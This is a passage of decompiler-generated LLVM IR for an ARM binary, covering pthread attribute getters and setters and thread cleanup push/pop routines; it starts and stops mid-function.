  uselistorder i32* %r5.global-to-local, { 0, 2, 1 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 1 }
  uselistorder i32* %r0.global-to-local, { 8, 7, 9, 1, 3, 5, 2, 6, 4, 10, 11, 12, 14, 13, 0 }
  uselistorder label %dec_label_pc_203bc, { 1, 0, 2 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @pthread_attr_destroy() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @__GI_pthread_attr_setdetachstate(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v2_203d8 = icmp ne i32 %arg2, 0
  %v7_203d8 = icmp eq i32 %arg2, 1
  %v2_203dc = xor i1 %v2_203d8, true
  %v3_203dc = or i1 %v7_203d8, %v2_203dc
  br i1 %v3_203dc, label %bb, label %bb2

bb:                                               ; preds = %entry
  store i32 %arg2, i32* %arg1, align 4
  br label %bb2

bb2:                                              ; preds = %entry, %bb
  %v2_203e0 = xor i1 %v7_203d8, true
  %v3_203e0 = and i1 %v2_203d8, %v2_203e0
  br i1 %v3_203e0, label %bb3, label %bb4

bb3:                                              ; preds = %bb2
  store i32 22, i32* %r0.global-to-local, align 4
  br label %bb4

bb4:                                              ; preds = %bb2, %bb3
  br i1 %v3_203dc, label %bb5, label %._crit_edge

._crit_edge:                                      ; preds = %bb4
  %v1_203e8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb6

bb5:                                              ; preds = %bb4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb6

bb6:                                              ; preds = %._crit_edge, %bb5
  %v1_203e8 = phi i32 [ %v1_203e8.pre, %._crit_edge ], [ 0, %bb5 ]
  ret i32 %v1_203e8

; uselistorder directives
  uselistorder i1 %v2_203d8, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 0 }
  uselistorder label %bb6, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
  uselistorder label %bb2, { 1, 0 }
}

define i32 @__GI_pthread_attr_getdetachstate(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_203ec = load i32, i32* %arg1, align 4
  %v2_203f4 = inttoptr i32 %arg2 to i32*
  store i32 %v2_203ec, i32* %v2_203f4, align 4
  ret i32 0
}

define i32 @__GI_pthread_attr_setschedpolicy(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v2_203fc = icmp ugt i32 %arg2, 1
  %v7_203fc = icmp eq i32 %arg2, 2
  %v2_20400 = xor i1 %v2_203fc, true
  %v3_20400 = or i1 %v7_203fc, %v2_20400
  br i1 %v3_20400, label %bb, label %bb2

bb:                                               ; preds = %entry
  %v6_20400 = add i32 %arg1, 4
  %v7_20400 = inttoptr i32 %v6_20400 to i32*
  store i32 %arg2, i32* %v7_20400, align 4
  br label %bb2

bb2:                                              ; preds = %entry, %bb
  %v2_20404 = xor i1 %v7_203fc, true
  %v3_20404 = and i1 %v2_203fc, %v2_20404
  br i1 %v3_20404, label %bb3, label %bb4

bb3:                                              ; preds = %bb2
  store i32 22, i32* %r0.global-to-local, align 4
  br label %bb4

bb4:                                              ; preds = %bb2, %bb3
  br i1 %v3_20400, label %bb5, label %._crit_edge

._crit_edge:                                      ; preds = %bb4
  %v1_2040c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb6

bb5:                                              ; preds = %bb4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb6

bb6:                                              ; preds = %._crit_edge, %bb5
  %v1_2040c = phi i32 [ %v1_2040c.pre, %._crit_edge ], [ 0, %bb5 ]
  ret i32 %v1_2040c

; uselistorder directives
  uselistorder i1 %v2_203fc, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 0 }
  uselistorder label %bb6, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
  uselistorder label %bb2, { 1, 0 }
}

define i32 @pthread_attr_getschedpolicy(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %v1_20410 = add i32 %arg1, 4
  %v2_20410 = inttoptr i32 %v1_20410 to i32*
  %v3_20410 = load i32, i32* %v2_20410, align 4
  store i32 %v3_20410, i32* %arg2, align 4
  ret i32 0
}

define i32 @pthread_attr_setinheritsched(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v2_20420 = icmp ne i32 %arg2, 0
  %v7_20420 = icmp eq i32 %arg2, 1
  %v2_20424 = xor i1 %v2_20420, true
  %v3_20424 = or i1 %v7_20420, %v2_20424
  br i1 %v3_20424, label %bb, label %bb2

bb:                                               ; preds = %entry
  %v6_20424 = add i32 %arg1, 12
  %v7_20424 = inttoptr i32 %v6_20424 to i32*
  store i32 %arg2, i32* %v7_20424, align 4
  br label %bb2

bb2:                                              ; preds = %entry, %bb
  %v2_20428 = xor i1 %v7_20420, true
  %v3_20428 = and i1 %v2_20420, %v2_20428
  br i1 %v3_20428, label %bb3, label %bb4

bb3:                                              ; preds = %bb2
  store i32 22, i32* %r0.global-to-local, align 4
  br label %bb4

bb4:                                              ; preds = %bb2, %bb3
  br i1 %v3_20424, label %bb5, label %._crit_edge

._crit_edge:                                      ; preds = %bb4
  %v1_20430.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb6

bb5:                                              ; preds = %bb4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb6

bb6:                                              ; preds = %._crit_edge, %bb5
  %v1_20430 = phi i32 [ %v1_20430.pre, %._crit_edge ], [ 0, %bb5 ]
  ret i32 %v1_20430

; uselistorder directives
  uselistorder i1 %v2_20420, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 0 }
  uselistorder label %bb6, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
  uselistorder label %bb2, { 1, 0 }
}

define i32 @pthread_attr_getinheritsched(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %v1_20434 = add i32 %arg1, 12
  %v2_20434 = inttoptr i32 %v1_20434 to i32*
  %v3_20434 = load i32, i32* %v2_20434, align 4
  store i32 %v3_20434, i32* %arg2, align 4
  ret i32 0
}

define i32 @pthread_attr_setscope(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_20444 = icmp eq i32 %arg2, 0
  br i1 %v2_20444, label %dec_label_pc_2045c, label %dec_label_pc_2044c

dec_label_pc_2044c:                               ; preds = %entry
  %v7_2044c = icmp eq i32 %arg2, 1
  %. = select i1 %v7_2044c, i32 95, i32 22
  ret i32 %.

dec_label_pc_2045c:                               ; preds = %entry
  %v2_2045c = add i32 %arg1, 16
  %v3_2045c = inttoptr i32 %v2_2045c to i32*
  store i32 0, i32* %v3_2045c, align 4
  ret i32 0
}

define i32 @pthread_attr_getscope(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %v1_20468 = add i32 %arg1, 16
  %v2_20468 = inttoptr i32 %v1_20468 to i32*
  %v3_20468 = load i32, i32* %v2_20468, align 4
  store i32 %v3_20468, i32* %arg2, align 4
  ret i32 0
}

define i32 @__pthread_attr_getguardsize(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %v1_20478 = add i32 %arg1, 20
  %v2_20478 = inttoptr i32 %v1_20478 to i32*
  %v3_20478 = load i32, i32* %v2_20478, align 4
  store i32 %v3_20478, i32* %arg2, align 4
  ret i32 0
}

define i32 @__pthread_attr_setstacksize(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_20488 = icmp ugt i32 %arg2, 16383
  br i1 %v2_20488, label %.thread1, label %bb4

.thread1:                                         ; preds = %entry
  %v3_2048c = add i32 %arg1, 32
  %v4_2048c = inttoptr i32 %v3_2048c to i32*
  store i32 %arg2, i32* %v4_2048c, align 4
  br label %bb4

bb4:                                              ; preds = %entry, %.thread1
  %storemerge = phi i32 [ 0, %.thread1 ], [ 22, %entry ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder label %bb4, { 1, 0 }
}

define i32 @__pthread_attr_getstacksize(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %v1_2049c = add i32 %arg1, 32
  %v2_2049c = inttoptr i32 %v1_2049c to i32*
  %v3_2049c = load i32, i32* %v2_2049c, align 4
  store i32 %v3_2049c, i32* %arg2, align 4
  ret i32 0
}

define i32 @__GI_pthread_attr_init(i32* %arg1) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-8 = alloca i32, align 4
  %v3_204ac = load i32, i32* @r4, align 4
  store i32 %v3_204ac, i32* %stack_var_-8, align 4
  store i32 %tmp, i32* %r4.global-to-local, align 4
  %v0_204b4 = call i32 @__GI_getpagesize()
  %v1_204b8 = sub i32 2097152, %v0_204b4
  store i32 %v0_204b4, i32* %r2.global-to-local, align 4
  %v2_204c0 = add i32 %tmp, 32
  %v3_204c0 = inttoptr i32 %v2_204c0 to i32*
  store i32 %v1_204b8, i32* %v3_204c0, align 4
  %v1_204cc = load i32, i32* %r4.global-to-local, align 4
  %v2_204cc = add i32 %v1_204cc, 12
  %v3_204cc = inttoptr i32 %v2_204cc to i32*
  store i32 1, i32* %v3_204cc, align 4
  %v1_204d0 = load i32, i32* %r4.global-to-local, align 4
  %v2_204d0 = inttoptr i32 %v1_204d0 to i32*
  store i32 0, i32* %v2_204d0, align 4
  %v1_204d4 = load i32, i32* %r4.global-to-local, align 4
  %v2_204d4 = add i32 %v1_204d4, 4
  %v3_204d4 = inttoptr i32 %v2_204d4 to i32*
  store i32 0, i32* %v3_204d4, align 4
  %v1_204d8 = load i32, i32* %r4.global-to-local, align 4
  %v2_204d8 = add i32 %v1_204d8, 8
  %v3_204d8 = inttoptr i32 %v2_204d8 to i32*
  store i32 0, i32* %v3_204d8, align 4
  %v1_204dc = load i32, i32* %r4.global-to-local, align 4
  %v2_204dc = add i32 %v1_204dc, 16
  %v3_204dc = inttoptr i32 %v2_204dc to i32*
  store i32 0, i32* %v3_204dc, align 4
  %v0_204e0 = load i32, i32* %r2.global-to-local, align 4
  %v1_204e0 = load i32, i32* %r4.global-to-local, align 4
  %v2_204e0 = add i32 %v1_204e0, 20
  %v3_204e0 = inttoptr i32 %v2_204e0 to i32*
  store i32 %v0_204e0, i32* %v3_204e0, align 4
  %v1_204e4 = load i32, i32* %r4.global-to-local, align 4
  %v2_204e4 = add i32 %v1_204e4, 28
  %v3_204e4 = inttoptr i32 %v2_204e4 to i32*
  store i32 0, i32* %v3_204e4, align 4
  %v1_204e8 = load i32, i32* %r4.global-to-local, align 4
  %v2_204e8 = add i32 %v1_204e8, 24
  %v3_204e8 = inttoptr i32 %v2_204e8 to i32*
  store i32 0, i32* %v3_204e8, align 4
  %v2_204ec = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_204ec, i32* %r4.global-to-local, align 4
  ret i32 0
}

define i32 @__pthread_attr_setguardsize(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  store i32 %arg1, i32* %r6.global-to-local, align 4
  %v0_20500 = call i32 @__GI_getpagesize()
  %v1_20508 = add i32 %v0_20500, -1
  %v2_20510 = add i32 %v1_20508, %arg2
  %v2_20514 = udiv i32 %v2_20510, %v0_20500
  store i32 %v2_20514, i32* %r0.global-to-local, align 4
  %v2_20518 = mul i32 %v2_20514, %v0_20500
  %v0_2051c = load i32, i32* %r6.global-to-local, align 4
  %v1_2051c = add i32 %v0_2051c, 32
  %v2_2051c = inttoptr i32 %v1_2051c to i32*
  %v3_2051c = load i32, i32* %v2_2051c, align 4
  %v3_20520 = icmp ult i32 %v2_20518, %v3_2051c
  br i1 %v3_20520, label %bb8, label %bb

bb:                                               ; preds = %entry
  store i32 22, i32* %r0.global-to-local, align 4
  br label %.thread1

bb8:                                              ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  %v3_2052c = add i32 %v0_2051c, 20
  %v4_2052c = inttoptr i32 %v3_2052c to i32*
  store i32 %v2_20518, i32* %v4_2052c, align 4
  %v1_20534.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %bb, %bb8
  %v1_20534 = phi i32 [ 22, %bb ], [ %v1_20534.pre, %bb8 ]
  ret i32 %v1_20534

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 0, 1 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__GI_pthread_attr_getschedparam(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_2053c = add i32 %arg1, 8
  store i32 %v1_2053c, i32* @r3, align 4
  store i32 4, i32* @r2, align 4
  store i32 %arg2, i32* @r0, align 4
  store i32 %v1_2053c, i32* @r1, align 4
  %v0_20550 = call i32 @memcpy()
  ret i32 0
}

define i32 @__GI_pthread_attr_setschedparam(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %r6.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg1, i32* @r4, align 4
  %v1_2056c = add i32 %arg1, 4
  %v2_2056c = inttoptr i32 %v1_2056c to i32*
  %v3_2056c = load i32, i32* %v2_2056c, align 4
  store i32 %tmp, i32* %r6.global-to-local, align 4
  %v1_20574 = call i32 @sched_get_priority_max(i32 %v3_2056c)
  store i32 %v1_20574, i32* @r5, align 4
  %v0_2057c = load i32, i32* @r4, align 4
  %v1_2057c = add i32 %v0_2057c, 4
  %v2_2057c = inttoptr i32 %v1_2057c to i32*
  %v3_2057c = load i32, i32* %v2_2057c, align 4
  %v1_20580 = call i32 @sched_get_priority_min(i32 %v3_2057c)
  %v0_20584 = load i32, i32* %r6.global-to-local, align 4
  %v1_20584 = inttoptr i32 %v0_20584 to i32*
  %v2_20584 = load i32, i32* %v1_20584, align 4
  store i32 %v2_20584, i32* @r3, align 4
  %v5_2058c = icmp slt i32 %v2_20584, %v1_20580
  br i1 %v5_2058c, label %dec_label_pc_205b4, label %dec_label_pc_20590

dec_label_pc_20590:                               ; preds = %entry
  %v1_20590 = load i32, i32* @r5, align 4
  %v8_20594 = icmp sgt i32 %v2_20584, %v1_20590
  br i1 %v8_20594, label %dec_label_pc_205b4, label %dec_label_pc_20598

dec_label_pc_20598:                               ; preds = %dec_label_pc_20590
  %v0_20598 = load i32, i32* @r4, align 4
  %v1_20598 = add i32 %v0_20598, 8
  store i32 %v1_20598, i32* @r0, align 4
  store i32 %v0_20584, i32* @r1, align 4
  store i32 4, i32* @r2, align 4
  %v0_205a4 = call i32 @memcpy()
  br label %dec_label_pc_205b4

dec_label_pc_205b4:                               ; preds = %entry, %dec_label_pc_20590, %dec_label_pc_20598
  %storemerge = phi i32 [ 0, %dec_label_pc_20598 ], [ 22, %dec_label_pc_20590 ], [ 22, %entry ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 (i32)* @sched_get_priority_max, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_205b4, { 2, 1, 0 }
}

define i32 @_thread_self.5() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v4_205cc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 64) to i32*), align 4
  %v1_205d0 = inttoptr i32 %v4_205cc to i32*
  %v2_205d0 = load i32, i32* %v1_205d0, align 4
  %v2_205d4 = ptrtoint i32* %stack_var_-8 to i32
  %v3_205d8 = icmp ult i32 %v2_205d4, %v2_205d0
  br i1 %v3_205d8, label %dec_label_pc_205e8, label %dec_label_pc_20614

dec_label_pc_205e8:                               ; preds = %entry
  %v4_205ec = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 44) to i32*), align 4
  %v1_205f0 = inttoptr i32 %v4_205ec to i32*
  %v2_205f0 = load i32, i32* %v1_205f0, align 4
  %v3_205f4 = icmp ult i32 %v2_205d4, %v2_205f0
  br i1 %v3_205f4, label %dec_label_pc_2061c, label %dec_label_pc_205fc

dec_label_pc_205fc:                               ; preds = %dec_label_pc_205e8
  %v4_20600 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 204) to i32*), align 4
  %v1_20604 = inttoptr i32 %v4_20600 to i32*
  %v2_20604 = load i32, i32* %v1_20604, align 4
  %v3_20608 = icmp ult i32 %v2_205d4, %v2_20604
  br i1 %v3_20608, label %dec_label_pc_20614, label %dec_label_pc_2061c

dec_label_pc_20614:                               ; preds = %dec_label_pc_205fc, %entry
  %v1_20614 = phi i32 [ add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 184), %entry ], [ add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 120), %dec_label_pc_205fc ]
  %v3_20614 = inttoptr i32 %v1_20614 to i32*
  %v4_20614 = load i32, i32* %v3_20614, align 4
  br label %dec_label_pc_20648

dec_label_pc_2061c:                               ; preds = %dec_label_pc_205fc, %dec_label_pc_205e8
  %v4_20620 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 112) to i32*), align 4
  %v1_20624 = inttoptr i32 %v4_20620 to i32*
  %v2_20624 = load i32, i32* %v1_20624, align 4
  %v2_20628 = icmp eq i32 %v2_20624, 0
  br i1 %v2_20628, label %dec_label_pc_20638, label %dec_label_pc_20630

dec_label_pc_20630:                               ; preds = %dec_label_pc_2061c
  %v0_20630 = call i32 @__pthread_find_self()
  br label %dec_label_pc_20648

dec_label_pc_20638:                               ; preds = %dec_label_pc_2061c
  %v3_20638 = and i32 %v2_205d4, -2097152
  %v4_20638 = xor i32 %v3_20638, -2097152
  %v1_20644 = sub i32 -352, %v4_20638
  br label %dec_label_pc_20648

dec_label_pc_20648:                               ; preds = %dec_label_pc_20630, %dec_label_pc_20614, %dec_label_pc_20638
  %v1_20650 = phi i32 [ %v0_20630, %dec_label_pc_20630 ], [ %v4_20614, %dec_label_pc_20614 ], [ %v1_20644, %dec_label_pc_20638 ]
  ret i32 %v1_20650

; uselistorder directives
  uselistorder label %dec_label_pc_20648, { 2, 0, 1 }
}

define i32 @function_20658(i16* %arg1) local_unnamed_addr {
dec_label_pc_20658:
  %v0_20658 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_20658, label %.thread, label %.thread4

.thread:                                          ; preds = %dec_label_pc_20658
  call void @llvm.trap()
  unreachable

.thread4:                                         ; preds = %dec_label_pc_20658
  %tmp = ptrtoint i16* %arg1 to i32
  ret i32 %tmp
}

define i32 @__pthread_perform_cleanup(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_20670 = load i32, i32* @r4, align 4
  store i32 %v3_20670, i32* %stack_var_-16, align 4
  store i32 %arg1, i32* %r6.global-to-local, align 4
  %v0_20678 = call i32 @_thread_self.5()
  store i32 %v0_20678, i32* %r0.global-to-local, align 4
  %v1_2067c = add i32 %v0_20678, 60
  %v2_2067c = inttoptr i32 %v1_2067c to i32*
  %v3_2067c = load i32, i32* %v2_2067c, align 4
  store i32 %v3_2067c, i32* %r4.global-to-local, align 4
  store i32 %v0_20678, i32* %r5.global-to-local, align 4
  %v2_206a42 = icmp eq i32 %v3_2067c, 0
  br i1 %v2_206a42, label %dec_label_pc_206ac, label %dec_label_pc_20688

dec_label_pc_20688:                               ; preds = %entry, %dec_label_pc_20690
  %v0_20690 = phi i32 [ %v3_206a0, %dec_label_pc_20690 ], [ %v3_2067c, %entry ]
  %v1_20688 = load i32, i32* %r6.global-to-local, align 4
  %tmp = icmp ugt i32 %v0_20690, %v1_20688
  br i1 %tmp, label %dec_label_pc_20690, label %dec_label_pc_206ac.loopexit

dec_label_pc_20690:                               ; preds = %dec_label_pc_20688
  %v1_20690 = add i32 %v0_20690, 4
  %v2_20690 = inttoptr i32 %v1_20690 to i32*
  %v3_20690 = load i32, i32* %v2_20690, align 4
  store i32 %v3_20690, i32* %r0.global-to-local, align 4
  %v1_20694 = inttoptr i32 %v0_20690 to i32*
  %v2_20694 = load i32, i32* %v1_20694, align 4
  call void @__pseudo_branch(i32 %v2_20694)
  %v0_206a0 = load i32, i32* %r4.global-to-local, align 4
  %v1_206a0 = add i32 %v0_206a0, 12
  %v2_206a0 = inttoptr i32 %v1_206a0 to i32*
  %v3_206a0 = load i32, i32* %v2_206a0, align 4
  store i32 %v3_206a0, i32* %r4.global-to-local, align 4
  %v2_206a4 = icmp eq i32 %v3_206a0, 0
  br i1 %v2_206a4, label %dec_label_pc_206ac.loopexit, label %dec_label_pc_20688

dec_label_pc_206ac.loopexit:                      ; preds = %dec_label_pc_20688, %dec_label_pc_20690
  %v0_206ac.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_206ac

dec_label_pc_206ac:                               ; preds = %dec_label_pc_206ac.loopexit, %entry
  %v0_206ac = phi i32 [ %v0_206ac.pre, %dec_label_pc_206ac.loopexit ], [ %v0_20678, %entry ]
  %v1_206ac = add i32 %v0_206ac, 252
  %v2_206ac = inttoptr i32 %v1_206ac to i32*
  %v3_206ac = load i32, i32* %v2_206ac, align 4
  %v1_206b4 = icmp ne i32 %v3_206ac, 0
  call void @__pseudo_cond_branch(i1 %v1_206b4, i32 ptrtoint (i32* @global_var_2b78c.1436 to i32))
  %v2_206b8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_206b8, i32* @r4, align 4
  %v1_206bc = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_206bc

; uselistorder directives
  uselistorder i32 %v3_206a0, { 1, 2, 0 }
  uselistorder i32 %v0_20690, { 2, 1, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_206ac.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_20688, { 1, 0 }
}

define i32 @__pthread_cleanup_push_defer(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r6.global-to-local, align 4
  %v0_206d0 = call i32 @_thread_self.5()
  store i32 %arg2, i32* %arg1, align 4
  %v3_206d4 = add i32 %tmp, 4
  %v4_206d4 = inttoptr i32 %v3_206d4 to i32*
  store i32 %arg3, i32* %v4_206d4, align 4
  %v1_206d8 = add i32 %v0_206d0, 60
  %v2_206d8 = inttoptr i32 %v1_206d8 to i32*
  %v3_206d8 = load i32, i32* %v2_206d8, align 4
  store i32 %v3_206d8, i32* %r2.global-to-local, align 4
  %v1_206dc = add i32 %v0_206d0, 65
  %v2_206dc = inttoptr i32 %v1_206dc to i8*
  %v3_206dc = load i8, i8* %v2_206dc, align 1
  %v4_206dc = zext i8 %v3_206dc to i32
  store i32 %v4_206dc, i32* %r3.global-to-local, align 4
  %v2_206e0 = icmp eq i32 %v3_206d8, 0
  %v1_206e4 = load i32, i32* %r6.global-to-local, align 4
  %v2_206e4 = add i32 %v1_206e4, 8
  %v3_206e4 = inttoptr i32 %v2_206e4 to i32*
  store i32 %v4_206dc, i32* %v3_206e4, align 4
  %v0_206e8 = load i32, i32* %r2.global-to-local, align 4
  %v1_206e8 = load i32, i32* %r6.global-to-local, align 4
  %v2_206e8 = add i32 %v1_206e8, 12
  %v3_206e8 = inttoptr i32 %v2_206e8 to i32*
  store i32 %v0_206e8, i32* %v3_206e8, align 4
  br i1 %v2_206e0, label %.thread, label %dec_label_pc_206f0

dec_label_pc_206f0:                               ; preds = %entry
  %v0_206f0 = load i32, i32* %r6.global-to-local, align 4
  %v1_206f0 = load i32, i32* %r2.global-to-local, align 4
  %v3_206f0 = icmp ult i32 %v0_206f0, %v1_206f0
  br i1 %v3_206f0, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_206f0
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_206f8 = add i32 %v0_206f0, 12
  %v4_206f8 = inttoptr i32 %v3_206f8 to i32*
  store i32 0, i32* %v4_206f8, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_206f0, %entry, %bb
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_20700 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_20700, i32* %v2_206d8, align 4
  %v0_20704 = load i32, i32* %r3.global-to-local, align 4
  %v1_20704 = trunc i32 %v0_20704 to i8
  store i8 %v1_20704, i8* %v2_206dc, align 1
  ret i32 %v0_206d0

; uselistorder directives
  uselistorder i32 %v0_206d0, { 2, 1, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 0 }
  uselistorder label %.thread, { 2, 0, 1 }
}

define i32 @_pthread_cleanup_pop(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-8 = alloca i32, align 4
  %v2_20710 = icmp eq i32 %arg2, 0
  %v3_20714 = load i32, i32* @r4, align 4
  store i32 %v3_20714, i32* %stack_var_-8, align 4
  store i32 %tmp, i32* %r4.global-to-local, align 4
  br i1 %v2_20710, label %.thread1, label %bb

bb:                                               ; preds = %entry
  %v3_20720 = load i32, i32* %arg1, align 4
  store i32 132908, i32* @lr, align 4
  br label %.thread1

.thread1:                                         ; preds = %entry, %bb
  %.02 = phi i32 [ %v3_20720, %bb ], [ undef, %entry ]
  %v2_20728 = xor i1 %v2_20710, true
  call void @__pseudo_cond_branch(i1 %v2_20728, i32 %.02)
  %v0_2072c = call i32 @_thread_self.5()
  %v0_20730 = load i32, i32* %r4.global-to-local, align 4
  %v1_20730 = add i32 %v0_20730, 12
  %v2_20730 = inttoptr i32 %v1_20730 to i32*
  %v3_20730 = load i32, i32* %v2_20730, align 4
  %v2_20734 = add i32 %v0_2072c, 60
  %v3_20734 = inttoptr i32 %v2_20734 to i32*
  store i32 %v3_20730, i32* %v3_20734, align 4
  %v2_20738 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_20738, i32* %r4.global-to-local, align 4
  ret i32 %v0_2072c

; uselistorder directives
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @_pthread_cleanup_push(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v3_20740 = load i32, i32* @r4, align 4
  store i32 %v3_20740, i32* %stack_var_-16, align 4
  store i32 %tmp, i32* %r6.global-to-local, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  %v0_20750 = call i32 @_thread_self.5()
  %v1_20754 = add i32 %v0_20750, 60
  %v2_20754 = inttoptr i32 %v1_20754 to i32*
  %v3_20754 = load i32, i32* %v2_20754, align 4
  store i32 %v3_20754, i32* %r3.global-to-local, align 4
  %v2_20758 = icmp eq i32 %v3_20754, 0
  %v0_2075c = load i32, i32* %r6.global-to-local, align 4
  %v1_2075c = inttoptr i32 %v0_2075c to i32*
  %v2_2075c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v2_2075c, i32* %v1_2075c, align 4
  %v3_2075c = add i32 %v0_2075c, 4
  %v4_2075c = inttoptr i32 %v3_2075c to i32*
  %v5_2075c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v5_2075c, i32* %v4_2075c, align 4
  %v0_20760 = load i32, i32* %r3.global-to-local, align 4
  %v1_20760 = load i32, i32* %r6.global-to-local, align 4
  %v2_20760 = add i32 %v1_20760, 12
  %v3_20760 = inttoptr i32 %v2_20760 to i32*
  store i32 %v0_20760, i32* %v3_20760, align 4
  br i1 %v2_20758, label %.thread, label %dec_label_pc_20768

dec_label_pc_20768:                               ; preds = %entry
  %v0_20768 = load i32, i32* %r6.global-to-local, align 4
  %v1_20768 = load i32, i32* %r3.global-to-local, align 4
  %v3_20768 = icmp ult i32 %v0_20768, %v1_20768
  br i1 %v3_20768, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_20768
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_20770 = add i32 %v0_20768, 12
  %v4_20770 = inttoptr i32 %v3_20770 to i32*
  store i32 0, i32* %v4_20770, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_20768, %entry, %bb
  %v0_20774 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_20774, i32* %v2_20754, align 4
  %v2_20778 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_20778, i32* %r4.global-to-local, align 4
  ret i32 %v0_20750

; uselistorder directives
  uselistorder label %.thread, { 2, 0, 1 }
}

define i32 @__pthread_cleanup_pop_restore(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
